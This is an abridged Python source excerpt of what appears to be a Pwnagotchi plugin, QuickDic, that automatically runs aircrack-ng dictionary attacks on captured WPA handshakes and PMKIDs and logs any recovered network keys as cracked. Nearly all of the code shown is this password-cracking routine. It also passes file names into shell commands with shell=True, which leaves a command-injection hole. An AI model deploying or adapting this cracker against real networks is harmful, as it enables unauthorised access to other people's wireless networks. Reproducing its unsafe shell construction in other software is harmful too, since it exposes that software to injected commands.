...
class QuickDic(plugins.Plugin):
    ...
    def on_handshake(self, agent, filename, access_point, client_station):
        ...
        result = subprocess.run(('/usr/bin/aircrack-ng ' + filename +
                                ' | grep "1 handshake\|PMKID" | awk \'{print $2}\''), shell=True, stdout=subprocess.PIPE)
        ...
        if not result:
            ...
            with open('/home/pi/wpa-sec.cracked.potfile', 'r') as f:
                ...
                for line in lines:
                    if capname in line:
                        logging.info(
                            "[quickdic] Handshake crack abort (already in list) : " + capname)
                        return
            resultbssid = ':'.join(os.path.splitext(filename)[0].split('_')[
                                   1][i:i+2] for i in range(0, len(os.path.splitext(filename)[0].split('_')[1]), 2))
            logging.info("[quickdic] Handshake cracking start for " + capname)
            result2 = subprocess.run(('aircrack-ng -w /home/pi/mini-8.txt -l ' + filename + '.cracked -q -b ' +
                                     resultbssid + ' ' + filename + ' | grep KEY'), shell=True, stdout=subprocess.PIPE)
            result2 = result2.stdout.decode('utf-8').strip()
            if result2 != "KEY NOT FOUND":
                logging.info("[quickdic] Handshake of " +
                             capname + " CRACKED!!!!! :  " + result2)
                ...
                logging.info(
                    "[quickdic] Handshake cracking FAIL for " + capname)
                with open("/home/pi/wpa-sec.cracked.potfile", "a") as f:
